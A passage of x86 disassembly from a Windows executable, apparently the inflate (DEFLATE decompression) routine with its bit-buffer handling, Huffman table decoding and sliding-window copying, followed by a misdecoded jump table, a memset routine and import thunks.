  407210:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  407214:	8b f0                	mov    %eax,%esi
  407216:	c1 e8 05             	shr    $0x5,%eax
  407219:	83 e0 1f             	and    $0x1f,%eax
  40721c:	b9 01 01 00 00       	mov    $0x101,%ecx
  407221:	83 e6 1f             	and    $0x1f,%esi
  407224:	03 f1                	add    %ecx,%esi
  407226:	40                   	inc    %eax
  407227:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40722a:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40722d:	52                   	push   %edx
  40722e:	8d 83 20 05 00 00    	lea    0x520(%ebx),%eax
  407234:	50                   	push   %eax
  407235:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407238:	50                   	push   %eax
  407239:	68 3c 8a 40 00       	push   $0x408a3c
  40723e:	68 fc 89 40 00       	push   $0x4089fc
  407243:	51                   	push   %ecx
  407244:	56                   	push   %esi
  407245:	8d 43 0c             	lea    0xc(%ebx),%eax
  407248:	50                   	push   %eax
  407249:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40724c:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  407253:	c7 45 f4 06 00 00 00 	movl   $0x6,-0xc(%ebp)
  40725a:	e8 0e f7 ff ff       	call   0x40696d
  40725f:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  407263:	75 03                	jne    0x407268
  407265:	83 c8 ff             	or     $0xffffffff,%eax
  407268:	85 c0                	test   %eax,%eax
  40726a:	0f 85 08 05 00 00    	jne    0x407778
  407270:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407273:	50                   	push   %eax
  407274:	8d 83 20 05 00 00    	lea    0x520(%ebx),%eax
  40727a:	50                   	push   %eax
  40727b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40727e:	50                   	push   %eax
  40727f:	68 b8 8a 40 00       	push   $0x408ab8
  407284:	68 7c 8a 40 00       	push   $0x408a7c
  407289:	6a 00                	push   $0x0
  40728b:	ff 75 f0             	push   -0x10(%ebp)
  40728e:	8d 44 b3 0c          	lea    0xc(%ebx,%esi,4),%eax
  407292:	50                   	push   %eax
  407293:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407296:	e8 d2 f6 ff ff       	call   0x40696d
  40729b:	85 c0                	test   %eax,%eax
  40729d:	0f 85 d5 04 00 00    	jne    0x407778
  4072a3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4072a6:	85 c0                	test   %eax,%eax
  4072a8:	75 0c                	jne    0x4072b6
  4072aa:	81 fe 01 01 00 00    	cmp    $0x101,%esi
  4072b0:	0f 8f c2 04 00 00    	jg     0x407778
  4072b6:	8a 4d fc             	mov    -0x4(%ebp),%cl
  4072b9:	83 23 00             	andl   $0x0,(%ebx)
  4072bc:	88 43 11             	mov    %al,0x11(%ebx)
  4072bf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4072c2:	89 43 14             	mov    %eax,0x14(%ebx)
  4072c5:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4072c8:	88 4b 10             	mov    %cl,0x10(%ebx)
  4072cb:	89 43 18             	mov    %eax,0x18(%ebx)
  4072ce:	eb 03                	jmp    0x4072d3
  4072d0:	8b 7d c8             	mov    -0x38(%ebp),%edi
  4072d3:	0f b6 43 10          	movzbl 0x10(%ebx),%eax
  4072d7:	89 43 0c             	mov    %eax,0xc(%ebx)
  4072da:	8b 43 14             	mov    0x14(%ebx),%eax
  4072dd:	89 43 08             	mov    %eax,0x8(%ebx)
  4072e0:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  4072e6:	eb 03                	jmp    0x4072eb
  4072e8:	8b 7d c8             	mov    -0x38(%ebp),%edi
  4072eb:	8b 43 0c             	mov    0xc(%ebx),%eax
  4072ee:	eb 21                	jmp    0x407311
  4072f0:	33 f6                	xor    %esi,%esi
  4072f2:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  4072f5:	0f 84 4a 04 00 00    	je     0x407745
  4072fb:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4072fe:	0f b6 11             	movzbl (%ecx),%edx
  407301:	ff 4d d0             	decl   -0x30(%ebp)
  407304:	8b cf                	mov    %edi,%ecx
  407306:	d3 e2                	shl    %cl,%edx
  407308:	09 55 c4             	or     %edx,-0x3c(%ebp)
  40730b:	ff 45 cc             	incl   -0x34(%ebp)
  40730e:	83 c7 08             	add    $0x8,%edi
  407311:	3b f8                	cmp    %eax,%edi
  407313:	72 db                	jb     0x4072f0
  407315:	0f b7 04 45 a0 a0 40 	movzwl 0x40a0a0(,%eax,2),%eax
  40731c:	00 
  40731d:	23 45 c4             	and    -0x3c(%ebp),%eax
  407320:	8b 4b 08             	mov    0x8(%ebx),%ecx
  407323:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  407326:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  40732a:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  40732d:	2b f9                	sub    %ecx,%edi
  40732f:	0f b6 08             	movzbl (%eax),%ecx
  407332:	89 7d c8             	mov    %edi,-0x38(%ebp)
  407335:	85 c9                	test   %ecx,%ecx
  407337:	75 12                	jne    0x40734b
  407339:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  40733d:	89 43 08             	mov    %eax,0x8(%ebx)
  407340:	c7 03 06 00 00 00    	movl   $0x6,(%ebx)
  407346:	e9 77 03 00 00       	jmp    0x4076c2
  40734b:	f6 c1 10             	test   $0x10,%cl
  40734e:	74 18                	je     0x407368
  407350:	83 e1 0f             	and    $0xf,%ecx
  407353:	89 4b 08             	mov    %ecx,0x8(%ebx)
  407356:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  40735a:	89 43 04             	mov    %eax,0x4(%ebx)
  40735d:	c7 03 02 00 00 00    	movl   $0x2,(%ebx)
  407363:	e9 5a 03 00 00       	jmp    0x4076c2
  407368:	f6 c1 40             	test   $0x40,%cl
  40736b:	75 12                	jne    0x40737f
  40736d:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  407370:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  407374:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  407377:	89 43 08             	mov    %eax,0x8(%ebx)
  40737a:	e9 43 03 00 00       	jmp    0x4076c2
  40737f:	f6 c1 20             	test   $0x20,%cl
  407382:	0f 84 48 03 00 00    	je     0x4076d0
  407388:	c7 03 07 00 00 00    	movl   $0x7,(%ebx)
  40738e:	e9 2f 03 00 00       	jmp    0x4076c2
  407393:	8b 43 08             	mov    0x8(%ebx),%eax
  407396:	8b 7d c8             	mov    -0x38(%ebp),%edi
  407399:	eb 21                	jmp    0x4073bc
  40739b:	33 f6                	xor    %esi,%esi
  40739d:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  4073a0:	0f 84 9f 03 00 00    	je     0x407745
  4073a6:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4073a9:	0f b6 11             	movzbl (%ecx),%edx
  4073ac:	ff 4d d0             	decl   -0x30(%ebp)
  4073af:	8b cf                	mov    %edi,%ecx
  4073b1:	d3 e2                	shl    %cl,%edx
  4073b3:	09 55 c4             	or     %edx,-0x3c(%ebp)
  4073b6:	ff 45 cc             	incl   -0x34(%ebp)
  4073b9:	83 c7 08             	add    $0x8,%edi
  4073bc:	3b f8                	cmp    %eax,%edi
  4073be:	72 db                	jb     0x40739b
  4073c0:	0f b7 0c 45 a0 a0 40 	movzwl 0x40a0a0(,%eax,2),%ecx
  4073c7:	00 
  4073c8:	23 4d c4             	and    -0x3c(%ebp),%ecx
  4073cb:	01 4b 04             	add    %ecx,0x4(%ebx)
  4073ce:	8b c8                	mov    %eax,%ecx
  4073d0:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  4073d3:	2b f8                	sub    %eax,%edi
  4073d5:	0f b6 43 11          	movzbl 0x11(%ebx),%eax
  4073d9:	89 43 0c             	mov    %eax,0xc(%ebx)
  4073dc:	8b 43 18             	mov    0x18(%ebx),%eax
  4073df:	89 43 08             	mov    %eax,0x8(%ebx)
  4073e2:	c7 03 03 00 00 00    	movl   $0x3,(%ebx)
  4073e8:	eb 03                	jmp    0x4073ed
  4073ea:	8b 7d c8             	mov    -0x38(%ebp),%edi
  4073ed:	8b 43 0c             	mov    0xc(%ebx),%eax
  4073f0:	eb 21                	jmp    0x407413
  4073f2:	33 f6                	xor    %esi,%esi
  4073f4:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  4073f7:	0f 84 48 03 00 00    	je     0x407745
  4073fd:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  407400:	0f b6 11             	movzbl (%ecx),%edx
  407403:	ff 4d d0             	decl   -0x30(%ebp)
  407406:	8b cf                	mov    %edi,%ecx
  407408:	d3 e2                	shl    %cl,%edx
  40740a:	09 55 c4             	or     %edx,-0x3c(%ebp)
  40740d:	ff 45 cc             	incl   -0x34(%ebp)
  407410:	83 c7 08             	add    $0x8,%edi
  407413:	3b f8                	cmp    %eax,%edi
  407415:	72 db                	jb     0x4073f2
  407417:	0f b7 04 45 a0 a0 40 	movzwl 0x40a0a0(,%eax,2),%eax
  40741e:	00 
  40741f:	23 45 c4             	and    -0x3c(%ebp),%eax
  407422:	8b 4b 08             	mov    0x8(%ebx),%ecx
  407425:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  407428:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  40742c:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  40742f:	2b f9                	sub    %ecx,%edi
  407431:	0f b6 08             	movzbl (%eax),%ecx
  407434:	89 7d c8             	mov    %edi,-0x38(%ebp)
  407437:	f6 c1 10             	test   $0x10,%cl
  40743a:	74 18                	je     0x407454
  40743c:	83 e1 0f             	and    $0xf,%ecx
  40743f:	89 4b 08             	mov    %ecx,0x8(%ebx)
  407442:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  407446:	89 43 0c             	mov    %eax,0xc(%ebx)
  407449:	c7 03 04 00 00 00    	movl   $0x4,(%ebx)
  40744f:	e9 6e 02 00 00       	jmp    0x4076c2
  407454:	f6 c1 40             	test   $0x40,%cl
  407457:	0f 85 73 02 00 00    	jne    0x4076d0
  40745d:	e9 0b ff ff ff       	jmp    0x40736d
  407462:	8b 43 08             	mov    0x8(%ebx),%eax
  407465:	8b 7d c8             	mov    -0x38(%ebp),%edi
  407468:	eb 21                	jmp    0x40748b
  40746a:	33 f6                	xor    %esi,%esi
  40746c:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  40746f:	0f 84 d0 02 00 00    	je     0x407745
  407475:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  407478:	0f b6 31             	movzbl (%ecx),%esi
  40747b:	ff 4d d0             	decl   -0x30(%ebp)
  40747e:	8b cf                	mov    %edi,%ecx
  407480:	d3 e6                	shl    %cl,%esi
  407482:	09 75 c4             	or     %esi,-0x3c(%ebp)
  407485:	ff 45 cc             	incl   -0x34(%ebp)
  407488:	83 c7 08             	add    $0x8,%edi
  40748b:	3b f8                	cmp    %eax,%edi
  40748d:	72 db                	jb     0x40746a
  40748f:	0f b7 0c 45 a0 a0 40 	movzwl 0x40a0a0(,%eax,2),%ecx
  407496:	00 
  407497:	23 4d c4             	and    -0x3c(%ebp),%ecx
  40749a:	01 4b 0c             	add    %ecx,0xc(%ebx)
  40749d:	8b c8                	mov    %eax,%ecx
  40749f:	d3 6d c4             	shrl   %cl,-0x3c(%ebp)
  4074a2:	2b f8                	sub    %eax,%edi
  4074a4:	89 7d c8             	mov    %edi,-0x38(%ebp)
  4074a7:	c7 03 05 00 00 00    	movl   $0x5,(%ebx)
  4074ad:	8b 43 0c             	mov    0xc(%ebx),%eax
  4074b0:	8b ca                	mov    %edx,%ecx
  4074b2:	2b cb                	sub    %ebx,%ecx
  4074b4:	81 e9 a0 1b 00 00    	sub    $0x1ba0,%ecx
  4074ba:	3b c8                	cmp    %eax,%ecx
  4074bc:	73 16                	jae    0x4074d4
  4074be:	8b 8b a0 9b 00 00    	mov    0x9ba0(%ebx),%ecx
  4074c4:	2b c8                	sub    %eax,%ecx
  4074c6:	2b cb                	sub    %ebx,%ecx
  4074c8:	8d bc 11 60 e4 ff ff 	lea    -0x1ba0(%ecx,%edx,1),%edi
  4074cf:	e9 c8 00 00 00       	jmp    0x40759c
  4074d4:	8b fa                	mov    %edx,%edi
  4074d6:	2b f8                	sub    %eax,%edi
  4074d8:	e9 bf 00 00 00       	jmp    0x40759c
  4074dd:	39 75 d8             	cmp    %esi,-0x28(%ebp)
  4074e0:	0f 85 96 00 00 00    	jne    0x40757c
  4074e6:	8b 8b a0 9b 00 00    	mov    0x9ba0(%ebx),%ecx
  4074ec:	3b d1                	cmp    %ecx,%edx
  4074ee:	75 27                	jne    0x407517
  4074f0:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  4074f6:	8d 93 a0 1b 00 00    	lea    0x1ba0(%ebx),%edx
  4074fc:	3b d0                	cmp    %eax,%edx
  4074fe:	74 17                	je     0x407517
  407500:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  407503:	73 08                	jae    0x40750d
  407505:	2b c2                	sub    %edx,%eax
  407507:	48                   	dec    %eax
  407508:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40750b:	eb 05                	jmp    0x407512
  40750d:	2b ca                	sub    %edx,%ecx
  40750f:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  407512:	39 75 d8             	cmp    %esi,-0x28(%ebp)
  407515:	75 65                	jne    0x40757c
  407517:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40751a:	8b 75 08             	mov    0x8(%ebp),%esi
  40751d:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  407523:	e8 e5 f3 ff ff       	call   0x40690d
  407528:	8b b3 a8 9b 00 00    	mov    0x9ba8(%ebx),%esi
  40752e:	8b 8b a4 9b 00 00    	mov    0x9ba4(%ebx),%ecx
  407534:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  407537:	3b f1                	cmp    %ecx,%esi
  407539:	73 07                	jae    0x407542
  40753b:	8b c1                	mov    %ecx,%eax
  40753d:	2b c6                	sub    %esi,%eax
  40753f:	48                   	dec    %eax
  407540:	eb 08                	jmp    0x40754a
  407542:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  407548:	2b c6                	sub    %esi,%eax
  40754a:	8b 93 a0 9b 00 00    	mov    0x9ba0(%ebx),%edx
  407550:	89 45 d8             	mov    %eax,-0x28(%ebp)
  407553:	3b f2                	cmp    %edx,%esi
  407555:	75 1d                	jne    0x407574
  407557:	8d b3 a0 1b 00 00    	lea    0x1ba0(%ebx),%esi
  40755d:	3b f1                	cmp    %ecx,%esi
  40755f:	74 13                	je     0x407574
  407561:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  407564:	73 07                	jae    0x40756d
  407566:	2b ce                	sub    %esi,%ecx
  407568:	49                   	dec    %ecx
  407569:	8b c1                	mov    %ecx,%eax
  40756b:	eb 04                	jmp    0x407571
  40756d:	2b d6                	sub    %esi,%edx
  40756f:	8b c2                	mov    %edx,%eax
  407571:	89 45 d8             	mov    %eax,-0x28(%ebp)
  407574:	85 c0                	test   %eax,%eax
  407576:	0f 84 20 02 00 00    	je     0x40779c
  40757c:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40757f:	8a 07                	mov    (%edi),%al
  407581:	88 02                	mov    %al,(%edx)
  407583:	42                   	inc    %edx
  407584:	47                   	inc    %edi
  407585:	ff 4d d8             	decl   -0x28(%ebp)
  407588:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  40758b:	3b bb a0 9b 00 00    	cmp    0x9ba0(%ebx),%edi
  407591:	75 06                	jne    0x407599
  407593:	8d bb a0 1b 00 00    	lea    0x1ba0(%ebx),%edi
  407599:	ff 4b 04             	decl   0x4(%ebx)
  40759c:	33 f6                	xor    %esi,%esi
  40759e:	39 73 04             	cmp    %esi,0x4(%ebx)
  4075a1:	0f 85 36 ff ff ff    	jne    0x4074dd
  4075a7:	89 33                	mov    %esi,(%ebx)
  4075a9:	e9 14 01 00 00       	jmp    0x4076c2
  4075ae:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  4075b2:	0f 85 98 00 00 00    	jne    0x407650
  4075b8:	8b 8b a0 9b 00 00    	mov    0x9ba0(%ebx),%ecx
  4075be:	39 4d d4             	cmp    %ecx,-0x2c(%ebp)
  4075c1:	75 28                	jne    0x4075eb
  4075c3:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  4075c9:	8d 93 a0 1b 00 00    	lea    0x1ba0(%ebx),%edx
  4075cf:	3b d0                	cmp    %eax,%edx
  4075d1:	74 18                	je     0x4075eb
  4075d3:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  4075d6:	73 08                	jae    0x4075e0
  4075d8:	2b c2                	sub    %edx,%eax
  4075da:	48                   	dec    %eax
  4075db:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4075de:	eb 05                	jmp    0x4075e5
  4075e0:	2b ca                	sub    %edx,%ecx
  4075e2:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4075e5:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  4075e9:	75 65                	jne    0x407650
  4075eb:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4075ee:	8b 75 08             	mov    0x8(%ebp),%esi
  4075f1:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  4075f7:	e8 11 f3 ff ff       	call   0x40690d
  4075fc:	8b bb a8 9b 00 00    	mov    0x9ba8(%ebx),%edi
  407602:	8b 8b a4 9b 00 00    	mov    0x9ba4(%ebx),%ecx
  407608:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  40760b:	3b f9                	cmp    %ecx,%edi
  40760d:	73 07                	jae    0x407616
  40760f:	8b c1                	mov    %ecx,%eax
  407611:	2b c7                	sub    %edi,%eax
  407613:	48                   	dec    %eax
  407614:	eb 08                	jmp    0x40761e
  407616:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  40761c:	2b c7                	sub    %edi,%eax
  40761e:	8b 93 a0 9b 00 00    	mov    0x9ba0(%ebx),%edx
  407624:	89 45 d8             	mov    %eax,-0x28(%ebp)
  407627:	3b fa                	cmp    %edx,%edi
  407629:	75 1d                	jne    0x407648
  40762b:	8d bb a0 1b 00 00    	lea    0x1ba0(%ebx),%edi
  407631:	3b f9                	cmp    %ecx,%edi
  407633:	74 13                	je     0x407648
  407635:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  407638:	73 07                	jae    0x407641
  40763a:	2b cf                	sub    %edi,%ecx
  40763c:	49                   	dec    %ecx
  40763d:	8b c1                	mov    %ecx,%eax
  40763f:	eb 04                	jmp    0x407645
  407641:	2b d7                	sub    %edi,%edx
  407643:	8b c2                	mov    %edx,%eax
  407645:	89 45 d8             	mov    %eax,-0x28(%ebp)
  407648:	85 c0                	test   %eax,%eax
  40764a:	0f 84 6d 01 00 00    	je     0x4077bd
  407650:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  407653:	8a 43 08             	mov    0x8(%ebx),%al
  407656:	ff 45 d4             	incl   -0x2c(%ebp)
  407659:	ff 4d d8             	decl   -0x28(%ebp)
  40765c:	88 01                	mov    %al,(%ecx)
  40765e:	83 23 00             	andl   $0x0,(%ebx)
  407661:	eb 5f                	jmp    0x4076c2
  407663:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  407667:	76 0a                	jbe    0x407673
  407669:	83 6d c8 08          	subl   $0x8,-0x38(%ebp)
  40766d:	ff 45 d0             	incl   -0x30(%ebp)
  407670:	ff 4d cc             	decl   -0x34(%ebp)
  407673:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407676:	8b 75 08             	mov    0x8(%ebp),%esi
  407679:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  40767f:	e8 89 f2 ff ff       	call   0x40690d
  407684:	8b 8b a8 9b 00 00    	mov    0x9ba8(%ebx),%ecx
  40768a:	8b 93 a4 9b 00 00    	mov    0x9ba4(%ebx),%edx
  407690:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  407693:	3b ca                	cmp    %edx,%ecx
  407695:	73 07                	jae    0x40769e
  407697:	8b c2                	mov    %edx,%eax
  407699:	2b c1                	sub    %ecx,%eax
  40769b:	48                   	dec    %eax
  40769c:	eb 08                	jmp    0x4076a6
  40769e:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  4076a4:	2b c1                	sub    %ecx,%eax
  4076a6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4076a9:	3b ca                	cmp    %edx,%ecx
  4076ab:	0f 85 0c 01 00 00    	jne    0x4077bd
  4076b1:	8b 83 14 05 00 00    	mov    0x514(%ebx),%eax
  4076b7:	89 03                	mov    %eax,(%ebx)
  4076b9:	83 f8 08             	cmp    $0x8,%eax
  4076bc:	0f 85 15 01 00 00    	jne    0x4077d7
  4076c2:	8b 03                	mov    (%ebx),%eax
  4076c4:	83 f8 0f             	cmp    $0xf,%eax
  4076c7:	0f 86 24 f6 ff ff    	jbe    0x406cf1
  4076cd:	8b 7d c8             	mov    -0x38(%ebp),%edi
  4076d0:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4076d3:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4076d6:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  4076dc:	8b 45 08             	mov    0x8(%ebp),%eax
  4076df:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  4076e5:	89 bb 18 05 00 00    	mov    %edi,0x518(%ebx)
  4076eb:	89 48 04             	mov    %ecx,0x4(%eax)
  4076ee:	e9 a3 00 00 00       	jmp    0x407796
  4076f3:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4076f6:	8b 75 08             	mov    0x8(%ebp),%esi
  4076f9:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  4076ff:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407702:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  407708:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40770c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40770f:	89 06                	mov    %eax,(%esi)
  407711:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407714:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  40771a:	e8 ee f1 ff ff       	call   0x40690d
  40771f:	33 c0                	xor    %eax,%eax
  407721:	5f                   	pop    %edi
  407722:	5e                   	pop    %esi
  407723:	5b                   	pop    %ebx
  407724:	c9                   	leave
  407725:	c2 04 00             	ret    $0x4
  407728:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40772b:	8b 75 08             	mov    0x8(%ebp),%esi
  40772e:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  407734:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407737:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  40773d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407740:	89 46 04             	mov    %eax,0x4(%esi)
  407743:	eb c7                	jmp    0x40770c
  407745:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  407748:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  40774e:	8b 45 08             	mov    0x8(%ebp),%eax
  407751:	89 bb 18 05 00 00    	mov    %edi,0x518(%ebx)
  407757:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40775a:	89 70 04             	mov    %esi,0x4(%eax)
  40775d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  407760:	8b 75 08             	mov    0x8(%ebp),%esi
  407763:	89 06                	mov    %eax,(%esi)
  407765:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407768:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  40776e:	e8 9a f1 ff ff       	call   0x40690d
  407773:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407776:	eb a9                	jmp    0x407721
  407778:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40777b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40777e:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  407784:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407787:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  40778d:	89 bb 18 05 00 00    	mov    %edi,0x518(%ebx)
  407793:	89 41 04             	mov    %eax,0x4(%ecx)
  407796:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40779a:	eb c1                	jmp    0x40775d
  40779c:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40779f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4077a2:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  4077a8:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4077ab:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  4077b1:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4077b4:	89 41 04             	mov    %eax,0x4(%ecx)
  4077b7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4077bb:	eb a0                	jmp    0x40775d
  4077bd:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4077c0:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  4077c6:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4077c9:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  4077cf:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4077d2:	89 46 04             	mov    %eax,0x4(%esi)
  4077d5:	eb e0                	jmp    0x4077b7
  4077d7:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4077da:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  4077e0:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4077e3:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  4077e9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4077ec:	89 46 04             	mov    %eax,0x4(%esi)
  4077ef:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4077f6:	e9 62 ff ff ff       	jmp    0x40775d
  4077fb:	8b ff                	mov    %edi,%edi
  4077fd:	d0 72 40             	shlb   $1,0x40(%edx)
  407800:	00 e8                	add    %ch,%al
  407802:	72 40                	jb     0x407844
  407804:	00 93 73 40 00 ea    	add    %dl,-0x15ffbf8d(%ebx)
  40780a:	73 40                	jae    0x40784c
  40780c:	00 62 74             	add    %ah,0x74(%edx)
  40780f:	40                   	inc    %eax
  407810:	00 ad 74 40 00 ae    	add    %ch,-0x51ffbf8c(%ebp)
  407816:	75 40                	jne    0x407858
  407818:	00 63 76             	add    %ah,0x76(%ebx)
  40781b:	40                   	inc    %eax
  40781c:	00 fb                	add    %bh,%bl
  40781e:	6c                   	insb   (%dx),%es:(%edi)
  40781f:	40                   	inc    %eax
  407820:	00 60 6e             	add    %ah,0x6e(%eax)
  407823:	40                   	inc    %eax
  407824:	00 b1 6e 40 00 97    	add    %dh,-0x68ffbf92(%ecx)
  40782a:	6f                   	outsl  %ds:(%esi),(%dx)
  40782b:	40                   	inc    %eax
  40782c:	00 fe                	add    %bh,%dh
  40782e:	6f                   	outsl  %ds:(%esi),(%dx)
  40782f:	40                   	inc    %eax
  407830:	00 cc                	add    %cl,%ah
  407832:	70 40                	jo     0x407874
  407834:	00 cd                	add    %cl,%ch
  407836:	76 40                	jbe    0x407878
  407838:	00 73 76             	add    %dh,0x76(%ebx)
  40783b:	40                   	inc    %eax
  40783c:	00 8b 4c 24 0c 85    	add    %cl,-0x7af3dbb4(%ebx)
  407842:	c9                   	leave
  407843:	76 23                	jbe    0x407868
  407845:	8a 44 24 08          	mov    0x8(%esp),%al
  407849:	0f b6 c0             	movzbl %al,%eax
  40784c:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  407852:	8b d1                	mov    %ecx,%edx
  407854:	53                   	push   %ebx
  407855:	57                   	push   %edi
  407856:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40785a:	c1 e9 02             	shr    $0x2,%ecx
  40785d:	f3 ab                	rep stos %eax,%es:(%edi)
  40785f:	8b ca                	mov    %edx,%ecx
  407861:	83 e1 03             	and    $0x3,%ecx
  407864:	f3 aa                	rep stos %al,%es:(%edi)
  407866:	5f                   	pop    %edi
  407867:	5b                   	pop    %ebx
  407868:	8b 44 24 04          	mov    0x4(%esp),%eax
  40786c:	c3                   	ret
  40786d:	cc                   	int3
  40786e:	ff 25 a4 82 40 00    	jmp    *0x4082a4
  407874:	ff 25 a0 82 40 00    	jmp    *0x4082a0
  40787a:	ff 25 9c 82 40 00    	jmp    *0x40829c
